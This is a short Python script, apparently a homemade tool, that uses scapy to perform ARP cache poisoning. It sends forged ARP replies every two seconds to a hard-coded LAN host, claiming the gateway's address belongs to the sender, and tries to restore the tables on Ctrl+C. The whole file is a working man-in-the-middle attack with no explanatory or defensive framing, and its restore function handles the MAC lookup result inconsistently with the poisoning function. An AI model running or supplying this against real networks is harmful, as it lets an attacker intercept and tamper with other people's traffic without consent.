from time import sleep
from scapy.layers.l2 import ARP
from scapy.sendrecv import send
from arp_scan import arpscan_getmac

def restore_arp_posion(target_ip: str, spoof_ip: str):
    spoof_ip_mac = arpscan_getmac(spoof_ip)
    target_ip_mac = arpscan_getmac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_ip_mac, psrc=spoof_ip, hwsrc=spoof_ip_mac)
    send(packet, count=4)

def arp_posion(target_ip: str, spoof_ip: str):
    target_mac = arpscan_getmac(target_ip)

    if not target_mac:
        print("[-] Couldn't Found Mac Address For", target_ip)
        exit(1)
    else:
        target_mac = target_mac[0][0]

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # hwsrc = will be our mac addr, automactilly

    sent_packets = 0
    try:
        while True:
            send(packet, verbose=False)

            sent_packets += 1
            print(f"\rPacket Sent: {sent_packets} ", end="")
            sleep(2)
    except KeyboardInterrupt:
        print("[-] CTRL + C, Seession Terminated")
        restore_arp_posion(target_ip, spoof_ip)


if __name__ == "__main__":
    arp_posion("192.168.29.237", "192.168.29.1")
